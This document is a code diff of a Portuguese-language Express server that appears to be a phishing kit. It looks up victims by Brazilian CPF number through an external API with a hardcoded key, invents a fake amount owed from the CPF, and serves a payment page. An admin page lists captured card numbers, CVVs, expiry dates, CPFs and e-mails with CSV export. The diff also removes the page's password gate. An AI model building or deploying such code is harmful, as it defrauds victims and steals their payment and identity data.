@@ -28,31 +28,42 @@ function formatarData(dataStr) {
   return dataStr;
 }
 
-// Função para gerar valor aleatório baseado no CPF
+
+// Função para gerar valor aleatório baseado no CPF (sempre o mesmo para o mesmo CPF)
 function gerarValorPorCPF(cpf) {
+  // Usa o CPF como semente para gerar um número consistente
   let hash = 0;
   for (let i = 0; i < cpf.length; i++) {
     hash = ((hash << 5) - hash) + cpf.charCodeAt(i);
     hash = hash & hash;
   }
+  // Gera um número entre 500 e 267889 (centavos)
   const min = 500;
-  const max = 150000;
+  const max = 150000;   // R$ 1.500,00 (em centavos) ← ALTERADO
   const valorCentavos = min + (Math.abs(hash) % (max - min + 1));
   const valorReais = (valorCentavos / 100).toFixed(2);
   return parseFloat(valorReais);
 }
 
+
+
 // ====================== ROTA PARA BUSCAR CPF ======================
 app.post('/buscar-cpf', async (req, res) => {
   const { cpf } = req.body;
+
   console.log(`🔍 Buscando CPF: ${cpf}`);
 
   if (!cpf || cpf.length !== 11) {
-    return res.status(400).json({ success: false, erro: 'CPF inválido - deve conter 11 dígitos' });
+    return res.status(400).json({ 
+      success: false, 
+      erro: 'CPF inválido - deve conter 11 dígitos' 
+    });
   }
 
   try {
     const fetch = await import('node-fetch');
+    
+    // Tenta chamar a API real
     const response = await fetch.default(`https://api.cpfhub.io/cpf/${cpf}`, {
       headers: {
         'x-api-key': 'f85803bb3199f5dcfa20607e2c12d4dc63ba3e9cab5ccdb0ca868ffeff44dc7d',
@@ -66,6 +77,8 @@ app.post('/buscar-cpf', async (req, res) => {
     }
 
     const data = await response.json();
+    
+    // Extrair dados da API
     let nomeUsuario = '';
     let dataNascimentoReal = '';
     
@@ -78,16 +91,19 @@ app.post('/buscar-cpf', async (req, res) => {
       nomeUsuario = data.nome;
     }
     
+    // Se não veio data de nascimento, gerar uma aleatória
     if (!dataNascimentoReal) {
       dataNascimentoReal = gerarDataAleatoria(1970, 2000);
     }
     
+    // Gerar 3 opções de data (1 real + 2 aleatórias)
     const opcoesDatas = [
       dataNascimentoReal,
       gerarDataAleatoria(1960, 1990),
       gerarDataAleatoria(1980, 2010)
     ];
     
+    // Embaralhar as opções
     for (let i = opcoesDatas.length - 1; i > 0; i--) {
       const j = Math.floor(Math.random() * (i + 1));
       [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
@@ -112,6 +128,7 @@ app.post('/buscar-cpf', async (req, res) => {
   } catch (err) {
     console.error('❌ Erro na API:', err.message);
     
+    // Dados simulados para fallback
     const nomeSimulado = `Usuário CPF ${cpf.slice(0,3)}.${cpf.slice(3,6)}.${cpf.slice(6,9)}-${cpf.slice(9)}`;
     const dataReal = gerarDataAleatoria(1970, 2000);
     
@@ -121,6 +138,7 @@ app.post('/buscar-cpf', async (req, res) => {
       gerarDataAleatoria(1980, 2010)
     ];
     
+    // Embaralhar
     for (let i = opcoesDatas.length - 1; i > 0; i--) {
       const j = Math.floor(Math.random() * (i + 1));
       [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
@@ -151,97 +169,13 @@ app.get('/pagamento.html', (req, res) => {
   res.sendFile(path.join(__dirname, 'pagamento.html'));
 });
 
-// ====================== ADMIN - VISUALIZAR CARTÕES SALVOS ======================
+// ====================== FALLBACK ======================
+app.use((req, res) => {
+  res.status(404).send('Página não encontrada');
+});
+
+// 🆕 NOVO - ADMIN - VISUALIZAR CARTÕES SALVOS NO LOCALSTORAGE
 app.get('/admin/ver-cartoes', (req, res) => {
-    
-    const visus1 = 90;
-    const visus2 = 7;
-    const visus3 = "ga3";
-    const calculo1 = visus2 * 111;
-    const visus4 = "777" + "ga" + (visus1 / 3);
-    const ja8 = visus4;
-    
-    const senhaDigitada = req.query.senha || '';
-    
-    if (senhaDigitada !== ja8) {
-        return res.send(`
-            <!DOCTYPE html>
-            <html lang="pt-BR">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Acesso Restrito</title>
-                <style>
-                    * { margin: 0; padding: 0; box-sizing: border-box; }
-                    body {
-                        font-family: 'Segoe UI', monospace;
-                        background: linear-gradient(135deg, #1a1a2e, #16213e);
-                        min-height: 100vh;
-                        display: flex;
-                        justify-content: center;
-                        align-items: center;
-                        color: #fff;
-                    }
-                    .login-box {
-                        background: #0f3460;
-                        padding: 40px;
-                        border-radius: 20px;
-                        width: 90%;
-                        max-width: 400px;
-                        text-align: center;
-                        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-                        border-left: 4px solid #ffb600;
-                    }
-                    h1 { color: #ffb600; margin-bottom: 20px; }
-                    input {
-                        width: 100%;
-                        padding: 12px;
-                        margin: 20px 0;
-                        border: none;
-                        border-radius: 8px;
-                        font-size: 16px;
-                        background: #1a1a2e;
-                        color: #fff;
-                        text-align: center;
-                    }
-                    button {
-                        background: #ffb600;
-                        color: #004aad;
-                        border: none;
-                        padding: 12px 30px;
-                        border-radius: 8px;
-                        cursor: pointer;
-                        font-weight: bold;
-                        font-size: 16px;
-                        width: 100%;
-                        transition: all 0.2s;
-                    }
-                    button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,182,0,0.3); }
-                    .error {
-                        background: #dc3545;
-                        color: white;
-                        padding: 10px;
-                        border-radius: 8px;
-                        margin-top: 15px;
-                    }
-                </style>
-            </head>
-            <body>
-                <div class="login-box">
-                    <h1>🔒 ACESSO RESTRITO</h1>
-                    <p>Área administrativa</p>
-                    <form method="GET" action="/admin/ver-cartoes">
-                        <input type="password" name="senha" placeholder="Digite a senha de acesso" autocomplete="off">
-                        <button type="submit">🔓 VERIFICAR</button>
-                    </form>
-                    ${senhaDigitada ? '<div class="error">❌ Acesso negado! Senha incorreta.</div>' : ''}
-                </div>
-            </body>
-            </html>
-        `);
-    }
-    
-    // ========== SENHA CORRETA - MOSTRA A PÁGINA ADMIN ==========
     res.send(`
         <!DOCTYPE html>
         <html lang="pt-BR">
@@ -258,7 +192,7 @@ app.get('/admin/ver-cartoes', (req, res) => {
                     color: #fff;
                 }
                 .container { max-width: 1200px; margin: 0 auto; }
-                h1 { text-align: center; margin-bottom: 10px; color: #ffb600; }
+                h1 { text-align: center; margin-bottom: 20px; color: #ffb600; }
                 .stats {
                     background: #0f3460;
                     padding: 15px;
@@ -316,23 +250,10 @@ app.get('/admin/ver-cartoes', (req, res) => {
                 }
                 .empty { text-align: center; padding: 40px; background: #0f3460; border-radius: 12px; }
                 footer { text-align: center; margin-top: 30px; padding: 20px; color: #888; font-size: 12px; }
-                .logout {
-                    text-align: right;
-                    margin-bottom: 15px;
-                }
-                .logout a {
-                    color: #ffb600;
-                    text-decoration: none;
-                    font-size: 12px;
-                }
-                .logout a:hover { text-decoration: underline; }
             </style>
         </head>
         <body>
             <div class="container">
-                <div class="logout">
-                    <a href="/admin/ver-cartoes">🚪 Sair</a>
-                </div>
                 <h1>📋 ADMIN - DADOS DOS CARTÕES</h1>
                 <div class="stats" id="stats">
                     <div class="stat-card">📊 Total: <span id="total">0</span></div>
@@ -345,7 +266,7 @@ app.get('/admin/ver-cartoes', (req, res) => {
                     <button onclick="copiarJSON()">📋 Copiar JSON</button>
                     <button class="btn-danger" onclick="limparDados()">🗑️ Limpar Todos</button>
                 </div>
-                <input type="text" class="search-box" id="search" placeholder="🔍 Buscar por nome, CPF, cartão..." onkeyup="filtrarDados()">
+                <input type="text" class="search-box" id="search" placeholder="🔍 Buscar por nome, CPF, cartão ou e-mail..." onkeyup="filtrarDados()">
                 <div id="lista-cartoes"></div>
                 <footer>⚠️ Acesso restrito - Apenas administradores</footer>
             </div>
@@ -411,7 +332,9 @@ app.get('/admin/ver-cartoes', (req, res) => {
                 function exportarCSV() {
                     if (todosCartoes.length === 0) { alert('Nenhum dado para exportar'); return; }
                     const headers = ['Nome', 'CPF', 'Cartão', 'Validade', 'CVV', 'E-mail', 'Valor', 'Data'];
-                    const linhas = todosCartoes.map(c => [c.nome, c.cpf, c.cartao, c.validade, c.cvv, c.email, c.valor, c.data].map(v => \`"\${v || ''}"\`).join(','));
+                    const linhas = todosCartoes.map(c => [
+                        c.nome, c.cpf, c.cartao, c.validade, c.cvv, c.email, c.valor, c.data
+                    ].map(v => \`"\${v || ''}"\`).join(','));
                     const csv = [headers.join(','), ...linhas].join('\\n');
                     const blob = new Blob([csv], { type: 'text/csv' });
                     const url = URL.createObjectURL(blob);
@@ -442,11 +365,6 @@ app.get('/admin/ver-cartoes', (req, res) => {
         </body>
         </html>
     `);
-});
-
-// ====================== FALLBACK ======================
-app.use((req, res) => {
-  res.status(404).send('Página não encontrada');
 });
 
 // ====================== INICIA O SERVIDOR ======================
